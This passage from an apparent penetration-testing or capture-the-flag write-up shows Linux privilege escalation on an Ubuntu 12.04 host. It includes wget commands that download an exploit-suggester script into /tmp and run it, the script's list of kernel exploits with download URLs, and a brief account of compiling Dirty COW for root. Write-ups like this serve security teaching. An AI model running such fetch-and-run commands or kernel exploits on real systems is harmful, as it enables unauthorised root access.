Looking around the system, we see that `/tmp` has `-wx-wx-wx` rights, which means \
we can write and execute but not read, which will help us to download files, \
compile programs, and execute them.

When running this [script](https://github.com/mzet-/linux-exploit-suggester), we found that dirty cow can help us escalate privileges. \
Running the command
```
$ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O /tmp/les.sh;
$ chmod +x /tmp/les.sh
$ /tmp/les.sh 
```
we get the following output
```
Available information:

Kernel version: 3.2.0
Architecture: i386
Distribution: ubuntu
Distribution version: 12.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

73 kernel space exploits
42 user space exploits

Possible Exploits:

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847.cpp
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2015-3202] fuse (fusermount)

   Details: http://seclists.org/oss-sec/2015/q2/520
   Exposure: probable
   Tags: debian=7.0|8.0,[ ubuntu=* ]
   Download URL: https://www.exploit-db.com/download/37089
   Comments: Needs cron or system admin interaction

[+] [CVE-2014-4699] ptrace/sysret

   Details: http://www.openwall.com/lists/oss-security/2014/07/08/16
   Exposure: probable
   Tags: [ ubuntu=12.04 ]
   Download URL: https://www.exploit-db.com/download/34134

[+] [CVE-2014-4014] inode_capable

   Details: http://www.openwall.com/lists/oss-security/2014/06/10/4
   Exposure: probable
   Tags: [ ubuntu=12.04 ]
   Download URL: https://www.exploit-db.com/download/33824

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: less probable
   Tags: ubuntu=16.04{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: less probable
   Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2017-1000370,CVE-2017-1000371] linux_offset2lib

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_offset2lib.c
   Comments: Uses "Stack Clash" technique

[+] [CVE-2017-1000366,CVE-2017-1000371] linux_ldso_dynamic

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=9|10,ubuntu=14.04.5|16.04.2|17.04,fedora=23|24|25
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_dynamic.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root PIEs

[+] [CVE-2017-1000366,CVE-2017-1000370] linux_ldso_hwcap

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: less probable
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Tags: ubuntu=(14.04|15.10){kernel:4.2.0-(18|19|20|21|22)-generic}
   Download URL: https://www.exploit-db.com/download/39166

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/39230

[+] [CVE-2014-5207] fuse_suid

   Details: https://www.exploit-db.com/exploits/34923/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/34923

[+] [CVE-2014-5119] __gconv_translit_find

   Details: http://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html
   Exposure: less probable
   Tags: debian=6
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/34421.tar.gz

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2013-2094] semtex

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Exposure: less probable
   Tags: RHEL=6
   Download URL: https://www.exploit-db.com/download/25444

[+] [CVE-2013-1959] userns_root_sploit

   Details: http://www.openwall.com/lists/oss-security/2013/04/29/1
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/25450

[+] [CVE-2013-0268] msr

   Details: https://www.exploit-db.com/exploits/27297/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/27297

[+] [CVE-2012-0809] death_star (sudo)

   Details: http://seclists.org/fulldisclosure/2012/Jan/att-590/advisory_sudo.txt
   Exposure: less probable
   Tags: fedora=16
   Download URL: https://www.exploit-db.com/download/18436
```

We know dirty cow enables privilege escalation, so we can get root access. \
So we created `/tmp/dirtycow.c`, compiled it with gcc and executed it so we can have root access and move around the system more freely.